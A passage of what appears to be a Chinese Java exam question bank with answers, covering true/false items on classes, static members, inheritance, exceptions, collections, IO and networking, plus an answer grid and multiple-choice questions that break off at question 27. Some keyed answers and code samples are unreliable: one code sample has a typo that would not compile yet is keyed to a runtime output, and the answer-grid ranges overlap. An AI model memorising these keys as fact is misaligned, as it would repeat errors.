<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Rectangle</span> &#123;   </span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">Rectangle</span><span class="params">(<span class="type">int</span> l)</span> &#123;  <span class="comment">//构造方法1</span></span><br><span class="line">  <span class="keyword">if</span> (l &gt; <span class="number">0</span>) &#123;</span><br><span class="line">   w = l;</span><br><span class="line">   h = l;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">Rectangle</span><span class="params">(<span class="type">int</span> w1, <span class="type">int</span> h1)</span> &#123;  <span class="comment">//构造方法2</span></span><br><span class="line">  <span class="keyword">if</span> (w1 &gt; <span class="number">0</span> &amp;&amp; h1 &gt; <span class="number">0</span>) &#123;</span><br><span class="line">   w = w1;</span><br><span class="line">   h = h1;</span><br><span class="line">  &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面使用Rectangle类创建一个对象，是否正确？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Rectangle rect=<span class="keyword">new</span> <span class="title class_">Rectangle</span>();</span><br></pre></td></tr></table></figure>

<p>F</p>
<p><strong>59</strong> .枚举类型定义了具有删除功能的方法。F</p>
<p>60.-5%3的运算结果是2。F</p>
<p>61.在JDK1.8及以后的版本中，使用如下语句是否正确？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str=<span class="string">&quot;*******&quot;</span>;</span><br><span class="line">  <span class="keyword">switch</span>(str)</span><br><span class="line">  &#123;</span><br><span class="line">     <span class="keyword">case</span> <span class="string">&quot;abc&quot;</span>:</span><br><span class="line">       <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">     <span class="keyword">case</span> <span class="string">&quot;def&quot;</span>:</span><br><span class="line">       <span class="comment">//.....</span></span><br><span class="line">       <span class="keyword">break</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>T</p>
<p><strong>62</strong>.定义一个类时，无论有没有显示地给出构造方法的定义，系统都会提供一个默认的、无参的构造方法。F</p>
<p>63.构造方法返回值类型可以用void进行声明。F</p>
<p>64.定义类的方法时，形式参数是基本数据类型，为值传递；形式参数是一个引用数据类型，为地址传递。T</p>
<p>65.静态方法中能直接调用非静态方法和非静态成员变量。F</p>
<p>66.非静态的成员变量（实例变量）能被静态方法（类方法）和非静态方法（实例方法）所直接使用。F</p>
<p>67.静态的成员（类变量和类方法）能被静态方法（类方法）和非静态方法（实例方法）所直接调用。T</p>
<p>68.静态的成员变量（类变量）能被静态方法（类方法）和非静态方法（实例方法）所直接使用。T</p>
<p>69.default package包中的类也能被其他包中的类所引用。F</p>
<p>70.创建一个类的时候，如果未指定包名，处于无名包（default packge）中。其他包中的类无法引用该类。T</p>
<p>71.在JDK提供的系统类库中，使用java.lang包中的类时，可以直接使用，不必使用import来进行导入。T</p>
<p>72.private不能修饰构造方法。F</p>
<p>73.在定义一个类的时候，如果类的成员被private所修饰，该成员不能在类的外部被直接访问。T</p>
<p>74.Abstract method cannot be static. 抽象方法不能是静态方法。T</p>
<p>75.抽象类能实例化一个对象。如：</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">abstract</span> <span class="keyword">class</span> <span class="title">A</span>()</span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<p>可以调用如下语句创建对象a:</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">A a<span class="operator">=</span>new A()<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>F</p>
<p>76.JAVA抽象类中一定含有抽象方法。F</p>
<p>77.含有抽象方法的类一定是抽象类，抽象类中一定含有抽象方法。F</p>
<p>78.任何一种类类型，都可以使用new关键字来创建对象。F</p>
<p>79.用final关键字修饰的成员变量和局部变量是常量，常量的赋值次数只有一次。T</p>
<p><strong>80</strong>.使用类的继承，目的是把多种对象间的共同的属性和共同行为抽取到父类中，因此子类对象和父类的关系表示是is-a的关系。T</p>
<p>81.有如下的父类和子类的定义，语法上是否正确?（ ）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>&#123;</span><br><span class="line"> <span class="type">int</span> a;</span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">A</span><span class="params">(<span class="type">int</span> a)</span></span><br><span class="line"> &#123;</span><br><span class="line">  <span class="built_in">this</span>.a=a;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">B</span> <span class="keyword">extends</span> <span class="title class_">A</span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>F</p>
<p>82.Java中被final关键字修饰的变量，若在声明时指定了初值，不能被重新赋值。T</p>
<p>83.当成员变量（属性）的访问权限不足时，可以通过增加公开的set方法和get方法对属性进行设置值或获取值来进行访问。T</p>
<p>84.使用上转型对象调用子类重写的<strong>成员</strong>变量时表现出多态性。F</p>
<p>85.使用上转型对象调用子类重写的<strong>方法</strong>时表现出多态性。T</p>
<p>86.抽象方法必须定义在抽象类中，所以抽象类中的方法都是抽象方法。F</p>
<p>87.Java类可以同时有2个直接父类。F</p>
<p>88.一个类如果实现一个接口，那么它就需要实现接口中定义的全部方法，否则该类必须定义成抽象类。T</p>
<p>89.接口和类不同，不具有单继承性，它可以继承多个接口。T</p>
<p>90.一个类的定义，可以继承一个父类的同时，再实现多个接口。T</p>
<p>91.Throwable 有两个重要的子类：Exception（异常）和 Error（错误）。异常是应用程序中可能的可预测、可恢复问题。大多数异常表示中度到轻度的问题；错误表示运行应用程序中较严重问题。大多数错误与代码编写者执行的操作无关，而表示代码运行时 JVM（Java 虚拟机）出现的问题。T</p>
<p>92.程序中异常对象的产生方式有两种形式：1、系统执行过程中，产生异常对象；2、程序用throw关键字人为抛出异常对象。T</p>
<p>93.若异常发生时，它没有捕获，后续的程序不受任何影响，依然能正常执行。F</p>
<p>94.一个异常处理中 finally语句块可以不出现，也可以出现一次。T</p>
<p>95.Java语言中的所有异常类都是java.lang.Throwable的子类。T</p>
<p>96.非运行时异常（受检异常或编译异常），指的是RuntimeException以外的异常，如：IOException、SQLException等以及用户自定义的Exception异常，类型上属于Exception类及其子类。从语法上是必须进行处理的异常，需要使用try-catch（try-catch-finally）结构进行处理或者利用throws向上层抛出。如果不处理，程序就不能编译通过。T</p>
<p>97.String类提供了丰富的方法，其中包含许多与正则表达式相关的方法。如：split、replaceFirst、replaceAll、matches等等，可用于对与正则表达式相匹配的字符串进行分割、替换、判断是否匹配操作。T</p>
<p>98.String对象和StringBuffer对象都是字符串类型，创建后的对象都可以原地修改。F</p>
<p>99.字符串缓冲区类允许在当前对象上进行追加、增加、删除、修改字符的操作。而字符串对象不具备这一特点，只要改变就生成一个新的对象。T</p>
<p>100.System类中的currentTimeMills()方法，返回一个long类型的、当前时刻距离标准时间GMT之间的毫秒值。T</p>
<p>101.由Date到String的转换需要用到SimpleDateFormat类对象的format方法。T</p>
<p>102.由String到Date的转换需要用到SimpleDateFormat类对象的parse方法。T</p>
<p>103.java.math.BigInteger类可以表示比long类型更大的整数，还提供了诸多方法，用于对两个大整数对象的加、减、乘、除、取余、求幂、求最大公约数等等数学运算。T</p>
<p>104.java.lang.Math类是一个最终类。其中包含许多用来进行科学计算的类方法和常量，它们都是Math类的静态成员。T</p>
<p><strong>105</strong>.对于泛型类或泛型接口，在编译过程中检查泛型类型的合法性，在对象进入和离开方法的边界处添加类型检查和类型转换的机制，并且泛型信息会保持到运行时阶段。F</p>
<p><strong>106</strong>.在Collection集合中元素类型必须是相同的。F</p>
<p>107.在java.util.List接口的实现类java.util.ArrayList所表示的集合中，元素是有序的并且可以重复。该数据结构底层由数组来实现，能够精确地控制每个元素的插入位置，或者删除某个位置的元素，对元素的随机访问速度特别快。T</p>
<p><strong>108</strong>.Set集合是有序的，不可以包含重复的对象。F</p>
<p><strong>109</strong>.List集合是有序的，可以包含重复的对象。T</p>
<p>110.集合Set是通过键-值对的方式来存储对象的。F</p>
<p>111.在java.util.Set接口的实现类java.util.HashSet所表示的集合中，元素是无序的并且不允许重复，因此不能利用索引位置访问元素。T</p>
<p>112由于编码方式不同，表达同样的信息产生的数据量大小不同。.T</p>
<p>113.如果一个File表示的目录对象下有文件或者子目录，调用delete()方法也可以将它们删除。F</p>
<p>114.通过File类可对文件属性进行修改。T</p>
<p>115.在FileReader类的对象中，利用read(char[] buf)和read(char[] buf,int off,int len)方法读取数据后，buf数组中全部存放的是本次读取的数据。F</p>
<p>116.InputStream类中的close()方法是用于关闭流并且释放流所占的系统资源。T</p>
<p><strong>117</strong>.BufferedInputStream和BufferedOutputStream不是字节缓冲流。F</p>
<p>118.在程序代码中，java.io.IOException异常必须被捕获或抛出，不能置之不理。T</p>
<p>119.Java系统的标准输入对象是System.in，标准输出对象有两个，分别是标准输出System.out和标准错误输出System.err。T</p>
<p><strong>120</strong>.Serializable接口是个空接口，它只是一个表示对象可以串行化的特殊标记。T</p>
<p>121.对象串行化（序列化）机制是指将程序中对象的状态转化为一个字节流，存储在文件中。T</p>
<p><strong>122</strong>.对象序列化是指将一个Java对象转换成一个I&#x2F;O流中的字节序列的过程。T</p>
<p>123.文件缓冲流的作用是提高文件的读&#x2F;写效率。T</p>
<p>124.通过IP地址可以连接到网络上指定计算机，端口号定位计算机中的某个应用程序，因此通过IP地址和端口号，就可以定位到网络上某主机上的应用程序。T</p>
<p>125.在网络通信中，对数据传输格式、传输速率、传输步骤等作了统一规定，只有通信双方共同遵守这个规定才能完成数据的交互，这种规定称为网络传输协议。T</p>
<p>126.TCP协议的特点是面向连接，即在传输数据前先在服务器端和客户端建立逻辑连接。T</p>
<p>127.使用TCP协议通信时，通信的两端以I&#x2F;O流的方式进行数据的交互。T</p>
<p>128.利用TCP协议进行通信，客户端和服务器端建立起连接，形成传输数据的通道之后，进行大数据量的传输，是可靠的传输协议。T</p>
<p>129.在TCP协议通信时，客户端和服务器端建立起连接，通过Socket套接字的getInputStream()返回此套接字的输入流，getOutputStream()返回套接字的输出流。通信的双方通过输入、输出流读写数据。T</p>
<p>130.Socket类的方法 shutdownInput和shutdownOutput的作用是关闭相应的输入、输出流，不关闭网络连接。它将输入、输出流移动到末尾，再没有数据可以读写了，将以后发过来的数据忽略掉。T</p>
<p><strong>131</strong>.由于UDP是面向无连接的协议，可以保证数据的完整性，因此在传输重要数据时建议使用UDP协议。F</p>
<p>132.Thread.sleep ()方法执行后，在指定时间内所有线程都会暂停，进入休眠状态。F</p>
<p>133.当调用一个正在进行线程的stop()方法时，该线程便会进入休眠状态。F</p>
<p>134.如果线程死亡，它就不能运行。T</p>
<p>135.在java程序中，只能使用英文的分号;，否则编译器会报告错误信息。T</p>
<p>136.Java语言在定义类时，可以将class写成Class。F</p>
<p>137.标识符可以为关键字。F</p>
<p>138常量就是程序中常常变化的数据。.F</p>
<p>139.在为double类型的变量赋值时，后面可以加字母D或d，也可以不添加。T</p>
<p>140.在进行自增（++）和自减（–）运算时，如果运算符++或–放在操作数的前面，则先进行自增或自减运算，再进行其他运算。T</p>
<p>141.运算符“&amp;”和“&amp;&amp;”都表示“与”操作。T</p>
<p>142.while、do…while、for循环语句都可以进行嵌套，并且它们之间也可以互相嵌套。T</p>
<p>143.break语句可以在循环语句或者switch条件语句中使用。T</p>
<p>144.在switch语句中，每个case关键字后面必须有break。F</p>
<p>145.浮点数常量指的是数学中的小数。T</p>
<p>146.在Java中，小数会被默认是double类型的值。T</p>
<p>147.Java允许在一个程序中定义多个同名的方法，但是参数的类型或个数必须不同，这就是方法的重载。T</p>
<p>148.代码int[][] arr &#x3D; new int[3][4]可以正确的定义一个二维数组。T</p>
<p>149.数组的最大下标的值比它的长度小1。T</p>
<p>150.Java中的每个类都至少有一个构造方法，一个类中如果没有定义构造方法，系统会自动为这个类创建一个默认的构造方法。T</p>
<p>151.构造方法不可以被继承。T</p>
<p>152.类中static修饰的变量或方法，可以使用类名或对象的引用变量访问。T</p>
<p>153.在静态方法内可以调用非静态方法。F</p>
<p>154静态代码块会随着类对象的创建而创建。F</p>
<p>155.不存在继承关系的情况下，也可以实现重写。F</p>
<p>156.Java中被final关键字修饰的变量，不能被重新赋值。T</p>
<p>157.抽象方法必须定义在抽象类中，所以抽象类中的方法都是抽象方法。F</p>
<p>158.Java中，子类可以覆盖父类中的任意方法。F</p>
<p>159.如果一个类继承了一个抽象类，但是没有完全复写父类的所有的抽象方法那么这个类也是抽象类。T</p>
<p>160.super调用父类构造方法的代码必须位于子类构造方法的第一行。T</p>
<p>161.循环嵌套是指在一个循环语句的循环体中再定义一个循环语句的语法结构。while、do…while、for循环语句都可以进行嵌套，并且它们之间也可以互相嵌套。T</p>
<p>162.break语句只用于循环语句中，它的作用是跳出循环。F</p>
<p>163.私有属性只能在它所在类中被访问，为了能让外界访问私有属性，需要提供一些使用public修饰的公有方法。T</p>
<p>164.子类重写的方法可以拥有比父类方法更加严格的访问权限。F</p>
<p>165.protected访问权限比默认访问权限严格。F</p>
<p>166.如将一个int类型的数转为byte类型，不会造成数据精度的丢失。F</p>
<p>167.同一个类的不同对象是完全独立的个体，它们分别拥有各自的属性。T</p>
<p>168.类中定义了一个有参的构造方法，系统还会再提供无参的构造方法。F</p>
<p>169.静态属性不能使用对象名直接访问。F</p>
<p>170.所谓方法重写，就是在同一个作用域内方法名相同但参数个数或者参数类型不同的方法。F</p>
<p>171.目标类型取值范围小于源类型时，需要进行强制类型转换。T</p>
<p>172.JAVA中常量名所有字母都大写，单词之间用下划线连接。T</p>
<p>173.在给变量起名时，computer和Computer是一样的。F</p>
<p>174.this关键字可以用来访问父类的成员变量和成员方法。F</p>
<p>175.JAVA中，一个接口允许继承多个接口。T</p>
<p>176.在Java中，含有抽象方法的类一定是抽象类。T</p>
<p>177.Java中continue语句的作用是结束本次迭代，开始下一次迭代。T</p>
<p>178.String是Java中定义的基本数据类型.F</p>
<p>179.Java语言不区分大小写.F</p>
<p>180.在Java中，变量的数据类型分为两种，即基本数据和引用数据 类型。T</p>
<p>181.构造方法可以是静态的。F</p>
<p>182.在实例方法或构造器中，this用来引用当前对象，通过使用this可引用当前对象的任何成员。T</p>
<p>183.引用一个类的属性或调用其方法，必须以这个类的对象为前缀。F</p>
<p>184.You can always successfully cast an instance of a superclass to a subclass.F</p>
<p>185.A protected datum or method can be accessed by its subclasses in any package.T</p>
<h3 id="答案"><a href="#答案" class="headerlink" title="答案"></a>答案</h3><p>1-20TFTFT   FFFFT TFTTF  FTTFT</p>
<p>21-40 FFFTT FFFTF FFTTT FFFTT</p>
<p>41-60 TFTFF FTFTT TTFTT TTFFF </p>
<p>61-80 TFFTF FTTFT TFTTF FFFTT</p>
<p>80-100 FTTFT FFTTT TTFTT TTFTT</p>
<p>101-120 TTTTF FTFTF TTFTF TFTTT</p>
<p>121-140 TTTTT TTTTT FFFTT FFFTT</p>
<p>141-160 TTTFT TTTTT TTFFF TFFTT</p>
<p>160-180 TFTFF FTFFF TTFFT TTFFT </p>
<h1 id="java选择"><a href="#java选择" class="headerlink" title="java选择"></a>java选择</h1><ol>
<li>下列哪个叙述是正确的？B</li>
</ol>
<p>A.一个类最多可以实现两个接口</p>
<p>B.允许接口中只有一个抽象方法</p>
<p>C.如果一个抽象类实现某个接口，那么它必须要重写接口中的全部方法</p>
<p>D.如果一个非抽象类实现某个接口，那么它可以只重写接口中的部分方法</p>
<ol start="2">
<li>关于对字符串缓冲区类的操作，如下代码执行结果是（ ）。B</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">StringBuffer buffer=<span class="keyword">new</span> <span class="title class_">StringBuffer</span>();</span><br><span class="line">System.out.println(buffer.length()+<span class="string">&quot; &quot;</span>+buffer.capacity());</span><br></pre></td></tr></table></figure>

<p>A.0 0</p>
<p>B.0 16</p>
<p>C.16 16</p>
<p>D.16 0</p>
<ol start="3">
<li>下列程序代码运行结果是：（ ）。B</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;    </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;     </span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;        </span><br><span class="line">         <span class="keyword">return</span> <span class="number">1</span>;     </span><br><span class="line">    &#125;     </span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object b)</span> &#123;        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;    </span><br><span class="line">   &#125;    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;        </span><br><span class="line">        <span class="type">Set</span> <span class="variable">set</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>();        </span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Test</span>());        </span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;ABC&quot;</span>));        </span><br><span class="line">        set.add(<span class="keyword">new</span> <span class="title class_">Test</span>());        </span><br><span class="line">        System.out.println(set.size());     </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.1</p>
<p>B.2</p>
<p>C.3</p>
<p>D.4</p>
<ol start="4">
<li>正确配置classpath环境变量的方式是：（ ）。D</li>
</ol>
<p>A.在系统环境变量classpath原有的字符串基础上，加上点符号和分号“.;”，然后再加上JDK安装路径下的bin目录</p>
<p>B.新建系统环境变量classpath，其值为：点符号和分号“.;”，然后再连上JDK安装路径下的bin目录</p>
<p>C.在系统环境变量classpath原有的字符串基础上，加上点符号和分号“.;”，然后再加上JDK安装路径下的lib目录</p>
<p>D.新建系统环境变量classpath，其值为：点符号和分号“.;”，然后再连上JDK安装路径下的lib目录</p>
<ol start="5">
<li>下面哪些元素不能作为Java标识符的首字符？（ ）B</li>
</ol>
<p>A.字母</p>
<p>B.数字</p>
<p>C.下划线_</p>
<p>D.$</p>
<ol start="6">
<li><p>有如下一维数组的定义：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span>[] arr1=<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">10</span>];</span><br></pre></td></tr></table></figure>

<p>arr1数组元素批量赋值（预设值为：100）的方式中，错误的有：B</p>
<p>A.Arrays.fill(arr1,100);</p>
<p>B.arr1.fill(100);</p>
<p>C.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;arr1.length;i++)</span><br><span class="line">&#123; arr1[i]=<span class="number">100</span>; &#125;</span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">   arr[i]=<span class="number">100</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>JAVA中，下面哪个赋值表达式正确：（ ）D</p>
<p>A.float f&#x3D;1.3;</p>
<p>B.char c&#x3D;”a”;</p>
<p>C.byte b&#x3D;257;</p>
<p>D.int i&#x3D;10;</p>
</li>
<li><p>下面说法错误的是：D</p>
<p>A.int i&#x3D;1,j&#x3D;1;</p>
<p>​    System.out.print(i&#x3D;&#x3D;j);</p>
<p>​    输出结果为true。</p>
<p>B.int i&#x3D;100,j&#x3D;100;</p>
<p>   System.out.print(i&#x3D;&#x3D;j);</p>
<p>   输出结果为true。</p>
<p>C.Integer i&#x3D;100,j&#x3D;100;</p>
<p>​    System.out.print(i&#x3D;&#x3D;j);</p>
<p>​    输出结果为true。</p>
<p>D.Integer i&#x3D;1000,j&#x3D;1000;</p>
<p>​     System.out.print(i&#x3D;&#x3D;j);</p>
<p>​     输出结果为true。</p>
</li>
<li><p>执行完以下代码<code>int[ ] x = new int[25]；</code>后，以下哪项说明是正确的（ ）。A</p>
<p>A.x[24]为0</p>
<p>B.x[25]为0</p>
<p>C.x[0]为空</p>
<p>D.x[24]未定义</p>
</li>
<li><p>有如下程序代码，程序运行的结果是（ ）。A</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">StringBuffer buffer=<span class="keyword">new</span> <span class="title class_">StringBuffer</span>(); </span><br><span class="line">buffer.append(<span class="string">&quot;abc&quot;</span>).append(<span class="string">&quot;123&quot;</span>); </span><br><span class="line">System.out.println(buffer); </span><br></pre></td></tr></table></figure>

<p>A.abc123</p>
<p>B.abc</p>
<p>C.123</p>
<p>D.空行</p>
</li>
<li><p>关于类和对象的关系，下列说法哪种说法是错误的？A</p>
<p>A.类和对象都是具体的。</p>
<p>B.类是抽象的，对象是具体的。</p>
<p>C.一般情况下，在定义类之后，能创建无数个对象，可以说，类能化身千万。</p>
<p>D.类是引用型数据类型。</p>
</li>
<li><p>有如下程序代码， 程序运行的结果是（ ）。D</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;sdut&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;I love &quot;</span> + s1;</span><br><span class="line"><span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="string">&quot;I love &quot;</span> + s1;</span><br><span class="line">System.out.print(s2 == s3);</span><br><span class="line">Sytem.out.println(<span class="string">&quot; &quot;</span>+s2.equals(s3));</span><br></pre></td></tr></table></figure>

<p>A.true false</p>
<p>B.true true</p>
<p>C.false false</p>
<p>D.false true</p>
</li>
<li><p>有如下代码，程序执行的结果是（ ）。B</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">String str1 <span class="operator">=</span> <span class="string">&quot;sdut@sdut.edu.cn&quot;</span><span class="comment">;</span></span><br><span class="line">String[] strings <span class="operator">=</span> str1.split(<span class="string">&quot;u&quot;</span>)<span class="comment">;</span></span><br><span class="line">System.out.println(Arrays.toString(strings))<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>A. sd, t@sd, t.ed, .cn</p>
<p>B. [sd, t@sd, t.ed, .cn]</p>
<p>C. [sdu, t@sdu, t.edu, .cn]</p>
<p>D. sdu, t@sdu, t.edu, .cn</p>
</li>
<li><p>有如下代码，程序执行的结果是（ ）。A</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> i= <span class="number">110</span>;    </span><br><span class="line">String str2=&quot;lucky&quot;+i+<span class="number">2</span>;    </span><br><span class="line"><span class="keyword">System</span>.<span class="keyword">out</span>.println(str2);    </span><br></pre></td></tr></table></figure>

<p>A.lucky1102</p>
<p>B.lucky112</p>
<p>C.1102lucky</p>
<p>D.112lucky</p>
</li>
<li><p>关于枚举类型，说法错误的是：（ ）。D</p>
<p>A.实质是类类型</p>
<p>B.可以定义若干个常量，如颜色、星期、月份等。</p>
<p>C.可利用 类型名称.values()方法列出所有常量</p>
<p>D.其定义的位置可以在main方法中</p>
</li>
<li><p>如下程序代码输出的结果是：（ ）。A</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="type">int</span> a=<span class="number">023</span>;</span><br><span class="line">       <span class="type">int</span> b=<span class="number">0x10</span>;</span><br><span class="line">       System.out.println(a+<span class="string">&quot; &quot;</span>+b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.19 16</p>
<p>B.23 16</p>
<p>C.23 10</p>
<p>D.19 10</p>
</li>
<li><p>关于构造方法定义与作用，下列说法<strong>错误</strong>的是：（ ）。C</p>
<p>A.用来创建类的实例时调用的方法</p>
<p>B.调用该方法时，对实例变量赋值</p>
<p>C.定义时，方法名称与类名相同，返回值类型可以不写，也可以写成void</p>
<p>D.一个类的构造方法可以定义多个，多个构造方法的参数有明显区别。</p>
</li>
<li><p>假设定义了类 Test ,正确创建对象的格式是( ）。B</p>
<p>A.Test t &#x3D; 1 ;</p>
<p>B.Test t &#x3D; new Test() ;</p>
<p>C.Test t &#x3D; new Test ;</p>
<p>D.Test t &#x3D; Test() ;</p>
</li>
<li><p>下列选项中，( ) 发生时将调用类的构造方法。B</p>
<p>A.调用对象方法</p>
<p>B.创建对象</p>
<p>C.使用对象变量</p>
<p>D.类定义</p>
</li>
<li><p>以下有关构造方法的说法，正确的是： ____。A</p>
<p>A.一个类的构造方法可以有多个</p>
<p>B.构造方法在类定义时被调用</p>
<p>C.构造方法只能由对象的其它方法调用</p>
<p>D.构造方法可以和类同名，也可以和类名不同</p>
</li>
<li><p>JAVA中，void 的含义：（ ）。C</p>
<p>A.方法体为空</p>
<p>B.定义的方法没有形参</p>
<p>C.定义的方法没有返回值</p>
<p>D.方法的返回值不能参加算术运算</p>
</li>
<li><p>为了区分方法重载中同名的不同方法，要求（ ）。A</p>
<p>A.形式参数个数不同或者类型不同</p>
<p>B.返回值类型不同</p>
<p>C.调用时用类名或对象名做前缀</p>
<p>D.形式参数名称不同</p>
</li>
<li><p>在Java中，一个类可同时定义许多同名的方法，这些方法的形式参数的个数、类型或顺序各不相同，传回的值也可以不相同，这种面向对象程序特性称为（ ）。D</p>
<p>A.封装</p>
<p>B.继承</p>
<p>C.覆盖</p>
<p>D.重载</p>
</li>
<li><p>在下面的代码中，程序执行的结果将是：（ ）。D</p>
<figure class="highlight processing"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span>(<span class="built_in">String</span>[] args) &#123;</span><br><span class="line">         <span class="built_in">String</span> <span class="built_in">str</span> = <span class="string">&quot;123&quot;</span>;</span><br><span class="line">         System.<span class="property">out</span>.<span class="property">println</span>(<span class="built_in">str</span>);</span><br><span class="line">         <span class="title function_">change</span>(<span class="built_in">str</span>);</span><br><span class="line">         System.<span class="property">out</span>.<span class="property">println</span>(<span class="built_in">str</span>);</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">change</span>(<span class="built_in">String</span> <span class="built_in">str</span>)&#123;</span><br><span class="line">      <span class="built_in">str</span> = <span class="string">&quot;456&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">456</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<p>B.</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">456</span><br><span class="line">456</span><br></pre></td></tr></table></figure>

<p>C.</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">123</span><br><span class="line">456</span><br></pre></td></tr></table></figure>

<p>D.</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">123</span><br><span class="line">123</span><br></pre></td></tr></table></figure>
</li>
<li><p>关于以下代码的说明，正确的是（ ）。C</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">Main</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="built_in">int</span> x = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        x += <span class="number">5</span>;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">&quot;x=&quot;</span> + x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span>(<span class="params">String args[ ]</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">&quot;x=&quot;</span> + x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        x /= <span class="number">3</span>;</span><br><span class="line">        System.<span class="keyword">out</span>.println(<span class="string">&quot;x=&quot;</span> + x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>A.不能通过编译，因为缺少方法名和返回类型</p>
<p>B.不能通过编译，因为只能有一个静态初始化器</p>
<p>C.编译通过，执行结果为：</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">x</span><span class="operator">=</span><span class="number">15</span></span><br><span class="line"><span class="attribute">x</span><span class="operator">=</span><span class="number">5</span></span><br><span class="line"><span class="attribute">x</span><span class="operator">=</span><span class="number">5</span></span><br></pre></td></tr></table></figure>

<p>D.编译通过，执行结果为：</p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">x</span><span class="operator">=</span><span class="number">3</span></span><br><span class="line"><span class="attribute">x</span><span class="operator">=</span><span class="number">8</span></span><br><span class="line"><span class="attribute">x</span><span class="operator">=</span><span class="number">8</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>类中的一个成员方法被下面哪个修饰符修饰，该方法只能在本类被访问？（ ）C</p>
<p>A.pubic</p>
